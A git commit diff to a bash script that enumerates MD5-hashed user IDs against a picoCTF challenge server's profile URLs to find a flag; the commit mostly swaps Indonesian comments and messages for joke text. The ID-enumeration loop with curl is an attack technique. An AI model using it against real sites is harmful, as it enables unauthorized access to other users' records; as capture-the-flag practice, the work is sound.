64af6fed99a3515f08745c9619d68a8bad3565e1
Gur <androoofr@gmail.com>
2026-05-12 10:42:27 +0700

    olalala

--- bash/cyberT/brute.sh
+++ bash/cyberT/brute.sh
@@ -2,23 +2,22 @@
 
 TARGET_BASE="http://crystal-peak.picoctf.net:52311/profile/user"
 
-echo "Starting Brute Force..."
+echo "olololo huhuhuhuh"
 echo "--------------------------"
 
 for i in {3000..3020}
 do
-    # Generate MD5 hash dari angka (tanpa newline)
+ 
     HASH=$(echo -n $i | md5sum | awk '{print $1}')
 
     URL="${TARGET_BASE}/${HASH}"
 
     echo -n "Checking ID $i ($HASH): "
 
-    # Curl dengan --silent supaya gak berisik,
-    # --max-time biar gak kelamaan nunggu kalau koneksi ampas
+    # Curl dengan --silent bair ga berisik banhet
     RESPONSE=$(curl -s "$URL")
 
-    # Kamu bisa filter outputnya, misalnya cari kata "picoCTF{"
+    # kentank bakar
     if [[ $RESPONSE == *"picoCTF{"* ]]; then
         echo -e "\n\n[!] FLAG FOUND at ID $i!"
         echo "$RESPONSE" | grep -o "picoCTF{[^}]*}"
@@ -29,4 +28,4 @@ do
 done
 
 echo "--------------------------"
-echo "Done, bre. Gak ada flag di range itu."
+echo "tis is de fleg bradar"
